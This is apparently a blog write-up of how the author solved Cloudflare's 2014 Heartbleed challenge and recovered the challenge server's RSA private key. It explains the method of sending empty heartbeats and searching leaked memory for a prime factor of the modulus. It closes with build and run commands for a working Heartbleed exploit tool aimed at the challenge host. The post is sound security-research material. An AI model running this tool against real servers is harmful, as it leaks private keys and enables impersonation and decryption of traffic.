title: Cracking Cloudflare's heartbleed challenge

## Challenge

At April 11th 2014 Cloudflare has published a [blog post][0] suggesting to
try out extracting a private key of their specially prepared
[challenge site][1] using the [Heartbleed][2] OpenSSL vulnerability. Being busy
at the time, I decided to give it a try a couple of hours later, if noone would
crack it yet. This was a legal way to do some hackery, after all!

## Method

The method of attack was following:

1. Send a lot of random-sized fake heartbeats (without body)
2. Try to find a 128-byte prime factor of the certificate's [modulus][3]
3. Generate the rest of the private key's parameters out of it

I wasn't searching for a PEM-encoded private key and/or:

```
-----BEGIN RSA PRIVATE KEY-----
```

for a couple of reasons:

* It is loaded only at the process startup
* The key may be encrypted, and there is no point in brute forcing it

According to my tests, DER-encoded key wasn't appearing in the memory either, so
trying to extract primes that are definitely in memory seem more feasible,
because they are stored in the following struct in OpenSSL:

```C
struct rsa_st
  {
  /* The first parameter is used to pickup errors where
   * this is passed instead of aEVP_PKEY, it is set to 0 */
  int pad;
  long version;
  const RSA_METHOD *meth;
  /* functional reference if 'meth' is ENGINE-provided */
  ENGINE *engine;
  BIGNUM *n;
  BIGNUM *e;
  BIGNUM *d;
  BIGNUM *p;
  BIGNUM *q;
  BIGNUM *dmp1;
  BIGNUM *dmq1;
  BIGNUM *iqmp;
  /* be careful using this if the RSA structure is shared */
  CRYPTO_EX_DATA ex_data;
  int references;
  int flags;

  /* Used to cache montgomery values */
  BN_MONT_CTX *_method_mod_n;
  BN_MONT_CTX *_method_mod_p;
  BN_MONT_CTX *_method_mod_q;

  /* all BIGNUM values are actually in the following data, if it is not
   * NULL */
  char *bignum_data;
  BN_BLINDING *blinding;
  BN_BLINDING *mt_blinding;
  };
```

Where `BIGNUM` is:

```C
struct bignum_st
  {
  BN_ULONG *d;	/* Pointer to an array of 'BN_BITS2' bit chunks. */
  int top;	/* Index of last used d +1. */
  /* The next are internal book keeping for bn_expand. */
  int dmax;	/* Size of the d array. */
  int neg;	/* one if the number is negative */
  int flags;
  };
```

And `d` field of `BIGNUM` is a pointer to a little-endian representation of the
number. Note that I could have been searching for a `dmp1`, `dmpq1` or `iqmp` as
well, but I was too lame at the time to put this in my tests.

## Implementation

Being a node.js core developer, the platform choice for the extraction script
was obvious to me. Unfortunately, since node.js is embedding OpenSSL and
exposing only some limited amount of methods as a JavaScript API, the
[patch to add fake heartbeat methods][4] was needed. (Update: patch is no longer
needed, just install module from npm).

Having this at hand, the implementation was almost straightforward. It is
available as an [OpenSource project on github][5] now. Here are instructions for
obtaining and using it:

```bash
# Update: patch is no longer needed, just install module from npm
git clone git://github.com/indutny/heartbleed
git clone git://github.com/joyent/node -b v0.10.26 node-hb
cd node-hb
git apply ../heartbleed/node-v0.10.26.patch
./configure --prefix=$HOME/.node/0.10.26-hb
make -j24 install
ls ./node

export PATH="$HOME/.node/0.10.26-hb/bin:$PATH"

# Here it goes
npm install -g heartbleed.js

heartbleed -h cloudflarechallenge.com -c 1000 >> key.pem
```

Note that it won't produce any result immediately, it took me 3 hours and a
certain amount of luck to obtain the key in a Cloudflare's challenge.
